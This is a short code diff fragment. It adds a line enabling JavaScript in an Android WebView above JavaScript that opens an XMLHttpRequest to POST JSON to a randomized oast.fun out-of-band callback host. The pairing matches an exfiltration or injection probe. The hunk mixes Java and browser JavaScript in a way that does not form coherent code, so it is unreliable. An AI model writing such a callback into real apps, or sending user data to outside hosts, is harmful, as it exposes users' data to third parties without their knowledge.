@@ -1,3 +1,4 @@
+webView.getSettings().setJavaScriptEnabled(true);
 var xhr = new XMLHttpRequest();
 xhr.open('POST', 'https://bartqtkbajnhmsotmlzp2mapscgdyaf8s.oast.fun', true);
 xhr.setRequestHeader('Content-type', 'application/json');
